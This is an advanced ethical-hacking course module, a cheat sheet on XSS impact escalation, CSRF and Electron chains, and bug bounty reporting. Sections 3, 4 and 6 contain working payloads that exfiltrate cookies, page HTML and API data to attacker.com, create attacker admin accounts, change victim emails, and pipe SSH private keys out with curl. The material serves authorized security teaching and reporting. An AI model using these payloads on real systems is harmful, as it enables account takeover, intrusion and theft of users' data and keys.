# Module 7 — Exploitation & Bug Bounty Methodology: Cheat Sheet & Field Reference

> **Scope:** Ethical hacking · Bug bounty · Secure coding · Defensive understanding  
> **Authorized testing only — never test systems without explicit permission**  
> **Level:** Advanced  
> **Date:** 2026-05

---

## 1. The Three Things That Separate Professionals

```
1. Impact demonstration
   Finding alert(1) is not a finding.
   Demonstrating account takeover is a finding.
   Triagers close alert(1) reports. They escalate account takeover reports.

2. Attack chaining
   Real-world XSS rarely exists in isolation.
   XSS + CSRF, XSS + IDOR, XSS + privilege escalation = critical findings.
   Neither vulnerability alone may be critical. Together they often are.

3. Methodology over luck
   Professionals find XSS systematically — map, identify, trace, test.
   They do not spray payloads and hope.
```

---

## 2. The Impact Ladder

Every finding should be escalated as high as the scope allows before reporting.

```
LEVEL 1 — Proof of concept
  alert(document.domain)
  Proves: JS executes in this origin
  Bug bounty value: Low / Informational alone
  Triager: "Can you demonstrate real impact?"

LEVEL 2 — Data access
  fetch('https://attacker.com/?c='+document.cookie)
  Proves: session data accessible
  Bug bounty value: Medium
  Triager: "Are cookies HttpOnly?"

LEVEL 3 — Session abuse (bypasses HttpOnly)
  Authenticated API calls as victim
  Full page HTML exfiltration
  Proves: attacker can act as the victim
  Bug bounty value: High
  Triager: "What's the worst case?"

LEVEL 4 — Account takeover
  Change email + trigger password reset
  Create attacker-controlled admin account
  Exfiltrate auth tokens / API keys
  Proves: permanent account compromise
  Bug bounty value: Critical
  Triager: "Accepted."

LEVEL 5 — Escalated / systemic impact
  XSS on admin panel → full application compromise
  XSS in Electron app → RCE on victim machine
  Worm-able XSS → all users compromised automatically
  Bug bounty value: Critical / Maximum
```

---

## 3. Professional PoC Payload Toolkit

### Level 1 — Origin confirmation
```javascript
alert(document.domain)
// Use domain not 1 — proves which origin the JS executes in
```

### Level 2 — Cookie exfiltration
```javascript
fetch('https://attacker.com/steal', {
  method: 'POST',
  mode: 'no-cors',  // prevents CORS errors blocking the request
  body: JSON.stringify({
    cookie: document.cookie,
    origin: location.href,
    userAgent: navigator.userAgent,
    timestamp: new Date().toISOString()
  })
});
```

**Why `mode: 'no-cors'`:** Without it, the browser blocks the fetch
due to CORS policy. The request still sends — you just can't read
the response. For exfiltration, sending is all you need.

### Level 3 — Full page exfiltration (bypasses HttpOnly)
```javascript
fetch('https://attacker.com/steal', {
  method: 'POST',
  mode: 'no-cors',
  body: JSON.stringify({
    html: document.documentElement.innerHTML,
    url: location.href,
    title: document.title
  })
});
// Captures everything the authenticated user sees
// Works even when document.cookie returns empty
```

### Level 3 — Authenticated API enumeration
```javascript
async function exfiltrateData() {
  const endpoints = [
    '/api/user/profile',
    '/api/user/payment-methods',
    '/api/admin/users',
    '/api/settings/api-keys'
  ];

  for (const endpoint of endpoints) {
    try {
      const res = await fetch(endpoint);
      const data = await res.text();
      await fetch('https://attacker.com/steal', {
        method: 'POST',
        mode: 'no-cors',
        body: JSON.stringify({ endpoint, data })
      });
    } catch(e) {}
  }
}
exfiltrateData();
```

### Level 4 — Account takeover via email change
```javascript
async function accountTakeover() {
  // Step 1 — get CSRF token
  const page = await fetch('/account/settings');
  const html = await page.text();
  const csrf = html.match(/name="csrf_token" value="([^"]+)"/)?.[1] || '';

  // Step 2 — change email to attacker's address
  await fetch('/api/account/email', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ email: 'attacker@evil.com', csrf_token: csrf })
  });

  // Step 3 — confirm to attacker server
  await fetch('https://attacker.com/confirmed', {
    method: 'POST',
    mode: 'no-cors',
    body: JSON.stringify({ status: 'email_changed', victim: location.href })
  });
}
accountTakeover();
// Attacker then triggers password reset to attacker@evil.com
// Full account takeover — no cookie ever needed
```

### Level 4 — Privileged account creation
```javascript
async function createAdminAccount() {
  // Read CSRF token from admin page
  const page = await fetch('/admin/users/new');
  const html = await page.text();
  const parser = new DOMParser();
  const doc = parser.parseFromString(html, 'text/html');
  const csrf = doc.querySelector('[name="authenticity_token"]')?.value;

  // Create attacker-controlled admin account
  const form = new FormData();
  form.append('authenticity_token', csrf);
  form.append('user[email]', 'attacker@evil.com');
  form.append('user[role]', 'admin');

  await fetch('/admin/users', { method: 'POST', body: form });

  await fetch('https://attacker.com/confirmed', {
    method: 'POST', mode: 'no-cors',
    body: JSON.stringify({ admin_created: true })
  });
}
createAdminAccount();
// Persistent access — survives after victim session ends
```

### Role-aware exploit (professional approach)
```javascript
async function exploit() {
  const profile = await fetch('/api/user/me').then(r => r.json());
  const isAdmin = profile.role === 'admin' || profile.role === 'workspace_owner';

  if (!isAdmin) {
    // Regular member — exfiltrate what they can see
    await fetch('https://attacker.com/collect', {
      method: 'POST', mode: 'no-cors',
      body: JSON.stringify({ role: profile.role, email: profile.email,
        html: document.documentElement.innerHTML })
    });
    return;
  }

  // Admin victim — full escalation
  const allUsers = await fetch('/api/admin/users').then(r => r.json());
  const apiKeys  = await fetch('/api/admin/api-keys').then(r => r.json());
  const page     = await fetch('/admin/settings').then(r => r.text());
  const csrf     = page.match(/csrf_token[^>]+value="([^"]+)"/)?.[1];

  await fetch('/api/admin/users/create', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json', 'X-CSRF-Token': csrf },
    body: JSON.stringify({ email: 'attacker@evil.com', role: 'admin',
      password: 'Attacker123!' })
  });

  await fetch('https://attacker.com/pwned', {
    method: 'POST', mode: 'no-cors',
    body: JSON.stringify({ users: allUsers, apiKeys: apiKeys,
      adminAccountCreated: true })
  });
}
exploit();
```

---

## 4. XSS + CSRF Chain

XSS completely bypasses CSRF protection. This is one of the most
important chains in web security.

**Why:** CSRF tokens prevent cross-site requests because the attacker
on evil.com cannot read the token from victim.com. XSS executes in
victim.com's own origin — it can read everything on the page,
including CSRF tokens.

```javascript
async function bypassCSRF() {
  // Read CSRF token from the target page — only possible from same origin
  const res = await fetch('/admin/users/new');
  const html = await res.text();
  const parser = new DOMParser();
  const doc = parser.parseFromString(html, 'text/html');
  const csrf = doc.querySelector('[name="authenticity_token"]').value;

  // Use the real token — CSRF protection completely bypassed
  const formData = new FormData();
  formData.append('authenticity_token', csrf);
  formData.append('user[email]', 'attacker@evil.com');
  formData.append('user[role]', 'admin');

  await fetch('/admin/users', { method: 'POST', body: formData });
}
```

**The chain:**
```
Stored XSS → executes in admin browser
           → reads CSRF token from page
           → submits forged admin request with real token
           → CSRF protection provides zero resistance
           → admin account created
```

---

## 5. XSS + Self-XSS + CSRF Escalation

Self-XSS (only affects attacker's own session) escalates when combined with CSRF:

```
1. Attacker identifies self-XSS in profile bio field
2. Attacker hosts evil.com with a form that POSTs the XSS payload
   to /api/profile/bio via CSRF
3. Victim visits evil.com — CSRF submits payload to victim's bio
4. Victim visits their own profile — XSS executes in their context
5. Self-XSS + CSRF = full XSS on victim

Additional escalation conditions:
- Support staff view the field during an investigation
- Multiple users share a session (kiosk, enterprise)
- Admin has a UI that previews user profiles

When you find self-XSS: always test if CSRF can deliver it to others.
```

---

## 6. XSS to RCE — Electron Apps

Electron desktop apps run Chromium + Node.js. If `nodeIntegration: true`,
XSS gives full filesystem and process access on the victim's machine.

```javascript
// Vulnerable Electron config
new BrowserWindow({
  webPreferences: {
    nodeIntegration: true,    // Node.js APIs in renderer — dangerous
    contextIsolation: false   // No separation between Node and browser
  }
});

// XSS payload in vulnerable Electron app — Node.js execution
const { exec } = require('child_process');

// Exfiltrate sensitive files
exec('cat ~/.ssh/id_rsa | curl -X POST https://attacker.com/key --data-binary @-');

// Windows equivalent
exec('type %USERPROFILE%\\.ssh\\id_rsa | curl -X POST https://attacker.com/key --data-binary @-');

// Secure Electron config
new BrowserWindow({
  webPreferences: {
    nodeIntegration: false,   // No Node.js in renderer
    contextIsolation: true,   // Strict separation
    sandbox: true,            // Process sandboxing
    preload: './preload.js'   // Expose only specific safe APIs
  }
});
```

**Real-world affected apps:** Older Discord, VS Code extensions,
several cryptocurrency wallet apps. Live bug class in the wild.

---

## 7. Worm-able XSS

A worm-able payload replicates itself to other users automatically,
without attacker involvement after initial injection.

**Classic scenario:** Social platform where profile bios render without encoding.
Payload in Alice's bio fires when Bob visits → writes same payload to Bob's bio →
fires when Carol visits Bob → spreads exponentially.

**Safe demonstration methodology:**

```
Option 1 — Controlled accounts (preferred)
  Register Account A and Account B
  Inject payload into Account A
  Log in as Account B, visit Account A
  Document that Account B now contains the payload
  Clean up both accounts before submitting report
  → Proves complete replication chain, zero impact on real users

Option 2 — Logic demonstration
  Replace the replication step with a harmless marker
  Show: CSRF token is readable (replication prerequisite proven)
  Show: bio update API accepts writes (replication step proven)
  Write 'XSS_REPLICATION_POSSIBLE' instead of the real payload
  State in report: "I have not executed full replication to avoid
  impacting other users. Steps 1-3 demonstrate all prerequisites."
```

**The Samy Worm (2005):** Infected 1 million MySpace profiles in 20 hours.
Canonical real-world example of worm-able XSS at scale.

---

## 8. The HttpOnly Counterargument

When a triager says "HttpOnly cookies — no cookie theft — Low severity":

```
"HttpOnly prevents document.cookie from returning session cookies.
It does not prevent the following, all demonstrated in this report:

1. Full page exfiltration
   document.documentElement.innerHTML captures everything the
   authenticated user sees — user PII, API keys, internal configs.

2. Authenticated API calls
   The victim's session cookie is sent automatically by the browser
   during XSS execution. We do not need to read it — we use it.
   Any endpoint the victim can access, the payload can call.

3. Account takeover
   Changing the victim's email via authenticated API call, then
   triggering a password reset, achieves permanent account
   compromise without ever reading the cookie value.

4. Persistent access
   Creating a new admin account via the admin API provides access
   that survives after the victim's session ends entirely.

HttpOnly is a defense against cookie theft specifically.
It provides zero protection against any of the above vectors."
```

---

## 9. CSP Assessment in Bug Reports

```
CSP: script-src 'self' 'unsafe-inline'
Assessment: Ineffective against this finding.
'unsafe-inline' permits all inline script execution.
This payload uses inline execution. The CSP is not engaged.

CSP: script-src 'self' 'nonce-STATIC_VALUE'
Assessment: Broken. Static nonce is readable from page source
and can be reused in injected scripts.

CSP: script-src 'self'  (with JSONP endpoint on same origin)
Assessment: Bypassable via same-origin script gadget.
<script src="/api/data?callback=PAYLOAD"> loads from 'self' — allowed.

CSP: script-src 'self' https://cdn.jsdelivr.net
Assessment: Bypassable via CDN package abuse.
Attacker publishes npm package, loads via whitelisted CDN.

Note for reports:
"The presence of a CSP header that does not restrict the attack
vector should not be used to reduce severity."
```

---

## 10. Bug Bounty Report Structure

### Title format
```
[Severity] [XSS type] in [specific location] via [vector]
leads to [terminal impact]

Examples:
[Critical] Stored XSS in support ticket subject leads to
admin account takeover via authenticated API abuse

[High] Reflected XSS in search parameter enables session
hijacking via cookie exfiltration on authenticated users

[Critical] DOM XSS via postMessage enables cross-origin
account takeover without victim interaction on target domain
```

### Full report template
```markdown
## Summary
[2-3 sentences: what, where, impact]

## Severity
[Critical / High / Medium / Low]

## Impact
[Bullet list of specific impacts demonstrated]
- Authenticated API calls performable as victim
- Admin dashboard HTML exfiltrated (user PII, API keys)
- Persistent admin account creatable
- All user data accessible via admin API

## Steps to Reproduce
1. [Exact numbered steps]
2. [Include test credentials if provided]
3. [Reference screenshots by number]

## Proof of Concept Payload
[Exact payload used]

## Rendered HTML
[Show the injection point in context]

## Attack Chain
[Diagram or numbered chain showing full flow]

## Evidence
[Screenshot 1: ...]
[Screenshot 2: ...]
[Screen recording: full attack chain]

## Remediation
[Specific fixes, not generic advice]
1. Output-encode [field] using [specific function]
2. Implement nonce-based CSP
3. Set HttpOnly and Secure on session cookies

## Scope and Impact Assessment
[Who is affected, how many users, what data is at risk]
```

### What triagers need to see
```
□ Exact reproduction steps — they must be able to replicate it
□ Rendered HTML showing the injection point
□ Screenshot or recording of execution
□ Evidence of impact beyond alert(1)
□ Specific remediation — not "sanitize input"
□ Clear severity justification answering:
  - Who is affected?
  - Does it require interaction?
  - What is the actual impact?
  - What privilege is needed to exploit it?
```

---

## 11. Severity Justification Framework

Four questions every triager asks. Answer all four in your report:

```
1. Who is affected?
   "All workspace members including administrators"
   Better than: "any user"

2. Does it require user interaction?
   "No — viewing the task list is normal workflow"
   Better than: "victim must be logged in"

3. What is the actual impact?
   "Admin account creation, full workspace data exfiltration"
   Better than: "could steal cookies"

4. What privilege is needed to exploit?
   "Standard member account — no special access"
   Better than: "attacker must be authenticated"
```

---

## 12. Scope Boundaries — Ethical Rules

```
ALWAYS:
□ Test only on authorized targets within defined scope
□ Use controlled test accounts — never real user accounts
□ Clean up injected payloads immediately after demonstration
□ Report findings promptly — do not sit on vulnerabilities
□ Follow responsible disclosure timelines
□ Use out-of-band servers you control (Burp Collaborator, interactsh)

NEVER:
□ Access real user data beyond what is needed to prove the issue
□ Run automated scanners unless explicitly permitted
□ Demonstrate worm-able XSS on real users — use controlled accounts
□ Chain findings beyond what is needed to demonstrate impact
□ Test outside defined scope even if you find a vector
□ Disclose publicly before the program's disclosure window closes
```

---

## 13. Out-of-Band Exfiltration Infrastructure

For demonstrating data exfiltration in reports, you need a server
you control. Options for ethical testing:

```
Burp Collaborator     — built into Burp Suite Pro, generates unique URLs
interactsh            — open source, self-hostable
webhook.site          — quick throwaway receivers
requestbin.com        — request inspection
canarytokens.org      — detection-focused but useful for PoC

Usage in payload:
fetch('https://YOUR-COLLABORATOR-URL/steal', {
  method: 'POST',
  mode: 'no-cors',
  body: document.cookie
});
```

---

## 14. Severity Reference

| Finding | Severity | Key factors |
|---|---|---|
| Stored XSS → admin account creation | Critical | No interaction, persistent access, privileged victim |
| Stored XSS → data exfiltration (no HttpOnly) | Critical | All users affected, no interaction |
| Stored XSS → data exfiltration (HttpOnly) | High | HttpOnly bypassed via API calls |
| Reflected XSS → admin session abuse | High | Requires crafted link to admin |
| DOM XSS via postMessage (no origin check) | High | Cross-origin, no crafted URL needed |
| XSS in Electron (nodeIntegration: true) | Critical | RCE on victim machine |
| Worm-able XSS | Critical | Exponential spread, all users at risk |
| Self-XSS alone | Low / Info | No other user affected |
| Self-XSS + CSRF | High | Escalates to full XSS on victims |
| XSS + CSRF bypass | Critical | CSRF protection eliminated entirely |

---

## 15. Key Mental Models

> "alert(1) proves execution. Account takeover proves impact.
>  Report the impact, not the execution."

> "HttpOnly stops cookie theft. It does not stop anything else.
>  The authenticated session is the asset — not the cookie string."

> "CSRF protection stops cross-site requests. XSS runs same-site.
>  XSS + CSRF token reading = CSRF protection is irrelevant."

> "Self-XSS + CSRF = full XSS. Two low findings can equal one critical."

> "Worm-able XSS: inject once, affect everyone. Demonstrate with
>  controlled accounts. Never run on real users."

> "In Electron with nodeIntegration: true, XSS is RCE.
>  Browser vulnerability becomes OS-level compromise."

> "The goal is not to find the vulnerability.
>  The goal is to understand its maximum impact and report it clearly."

---

## 16. Coming Up — Module 8: Secure Coding & Defense in Depth

- Build a complete vulnerable application from scratch
- Full security audit — find every XSS vector systematically
- Secure refactor — fix every finding with correct context-aware defenses
- Defense stack implementation — CSP, Trusted Types, DOMPurify, rate limiting
- Code review methodology — what to look for, in what order
- Security testing checklist — the complete pre-deployment audit
- Putting it all together — from attacker mindset to defender architecture